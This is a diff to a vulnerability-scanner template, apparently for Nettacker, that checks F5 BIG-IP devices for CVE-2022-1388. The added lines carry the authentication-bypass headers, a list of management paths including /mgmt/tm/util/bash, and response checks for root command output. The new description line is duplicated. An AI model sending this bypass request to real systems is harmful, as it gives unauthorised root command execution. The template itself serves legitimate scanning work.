@@ -2,9 +2,10 @@ info:
   name: f5_bigip_cve_2022_1388_vuln
   author: Prajwal G N (@Prajwal5755)
   severity: 9.8
-  description: Detects F5 BIG-IP CVE-2022-1388 authentication bypass leading to remote command execution via /mgmt/tm/util/bash endpoint.
+  description: Detects F5 BIG-IP CVE-2022-1388 authentication bypass leading to remote command execution via endpoint and payload.Detects F5 BIG-IP CVE-2022-1388 authentication bypass leading to remote command execution via endpoint and payload.
   reference:
     - https://nvd.nist.gov/vuln/detail/CVE-2022-1388
+    - https://www.vulncheck.com/blog/new-cve-2022-1388
   profiles:
     - vuln
     - http
@@ -20,24 +21,33 @@ payloads:
         timeout: 3
         headers:
           Authorization: "Basic YWRtaW46"
-          X-F5-Auth-Token: "anything"
+          X-F5-Auth-Token: "asdf"
           User-Agent: "{user_agent}"
+          Connection: "X-F5-Auth-Token"
+          Host: "localhost"
+          Accept: "*/*"
           Content-Type: "application/json"
-
-        ssl: false
+          
 
         url:
           nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/mgmt/tm/util/bash"
+            input_format: "{{schema}}://{target}:{{ports}}{{path}}"
+            prefix: ""
+            interceptors: []
+            suffix: ""
             data:
               schema:
                 - "http"
                 - "https"
+              path:
+                - "/mgmt/tm/util/bash"
+                - "/mgmt/tm/util/"
+                - "/mgmt/shared"
               ports:
-                - 80
                 - 443
                 - 8080
                 - 8443
+
 
         data: |
           {{
@@ -46,15 +56,13 @@ payloads:
           }}
 
         response:
-          log: "Confirmed CVE-2022-1388 vulnerability at: response_dependent['url']"
+          log: "Confirmed CVE-2022-1388 vulnerability detected"
           condition_type: and
           conditions:
             status_code:
               regex: "200"
               reverse: false
             content:
-              regex: "uid=0"
+              regex: "(uid=|gid=|groups=|root)"
               reverse: false
-            url:
-              regex: ".*"
-              reverse: false
+            
